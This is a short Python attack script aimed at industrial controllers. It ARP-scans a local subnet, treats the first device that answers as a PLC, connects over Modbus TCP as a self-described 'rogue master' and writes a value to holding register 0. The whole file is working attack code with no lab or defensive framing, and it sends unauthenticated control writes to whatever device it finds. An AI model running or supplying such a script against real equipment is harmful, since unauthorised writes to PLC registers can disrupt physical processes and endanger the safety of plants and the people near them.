from scapy.all import ARP, Ether, srp
from pyModbusTCP.client import ModbusClient
import time

# Define the network range to scan
NETWORK_RANGE = "192.168.1.1/24"

# Function to scan the network for the PLC
def find_plc_ip():
    print("[*] Scanning network for PLC...")
    
    # ARP request to get all available devices in the subnet
    arp_request = ARP(pdst=NETWORK_RANGE)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request

    answered_list, _ = srp(arp_request_broadcast, timeout=2, verbose=False)

    for sent, received in answered_list:
        # Print discovered devices
        print(f"[+] Found Device: IP={received.psrc}, MAC={received.hwsrc}")

        # Assuming PLC has a known MAC address vendor prefix or pattern (could be refined)
        return received.psrc  # Returns the first IP found (modify as needed)

    print("[!] No PLC found!")
    return None

# Function to send rogue commands
def rogue_master_attack(plc_ip):
    print(f"[*] Attempting to communicate with PLC at {plc_ip}...")
    
    # Connect as a rogue master
    client = ModbusClient(host=plc_ip, port=502, auto_open=True)

    if client.open():
        print("[+] Connected to PLC as rogue master!")

        # Send a rogue Modbus write command (Example: Toggle Register 0x00)
        print("[*] Sending rogue WRITE command to the PLC...")
        
        # Example: Write value '1' to holding register 0 (Modify as per PLC setup)
        if client.write_single_register(0, 1):
            print("[+] Successfully modified register, rogue command executed!")
        else:
            print("[!] Failed to write register.")

        # Close connection
        client.close()
    else:
        print("[!] Unable to connect to PLC.")

# Main Execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        rogue_master_attack(plc_ip)
    else:
        print("[!] Exiting... No PLC detected.")